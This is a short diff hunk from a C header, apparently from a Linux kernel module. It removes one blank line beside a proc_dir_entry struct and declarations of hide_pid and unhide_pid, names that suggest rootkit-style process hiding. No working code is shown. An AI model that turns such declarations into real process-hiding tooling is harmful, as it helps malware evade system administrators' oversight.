@@ -23,7 +23,6 @@ struct proc_dir_entry {
 	u8 namelen;
 	char name[];
 };
-
 bool hide_pid(const char *pid);
 bool unhide_pid(const char *pid);
 
